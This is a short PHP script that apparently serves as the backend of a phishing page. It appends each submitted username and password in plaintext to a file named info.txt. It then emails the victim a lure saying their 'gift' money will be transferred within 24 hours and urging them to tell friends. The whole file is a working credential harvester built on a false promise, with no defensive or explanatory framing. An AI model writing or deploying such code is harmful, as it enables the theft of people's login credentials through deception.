
<?php

if(isset($_POST['username'])&&isset($_POST['password']))
{	$username=$_POST['username'];
	$password=$_POST['password'];
	$file=fopen('info.txt','a');
	fwrite($file,"\n".'username='.$username.'  password='.$password);
	$subject='regarding your gift';
	$body="Thank you for visiting our site. \n\n Tell your friends and try to get more benifits.\n\n\n your money will be transfered in next 24hrs.";
	$headers='From:Anurag<anurag@world.com>';
	if(mail($username,$subject,$body,$headers))
		echo 'mail has been sent to  '.$username.'  please check it';
	else
		echo 'somethink went wrong please check your username or email address';
	
	
}
?>
